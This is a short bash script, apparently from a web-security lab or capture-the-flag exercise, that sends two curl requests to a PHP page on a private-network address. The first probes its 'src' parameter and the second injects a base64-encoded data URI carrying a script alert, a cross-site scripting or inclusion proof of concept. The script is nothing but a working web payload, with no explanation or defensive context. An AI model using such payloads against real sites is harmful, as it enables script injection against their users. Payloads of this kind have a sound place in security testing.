#!/bin/bash
curl "http://10.0.2.15/index.php?page=media&src=nsa" -v
curl "http://10.0.2.15/index.php?page=media&src=data:text/html;base64,"`echo "<script>alert('f');</script>" | base64` -v
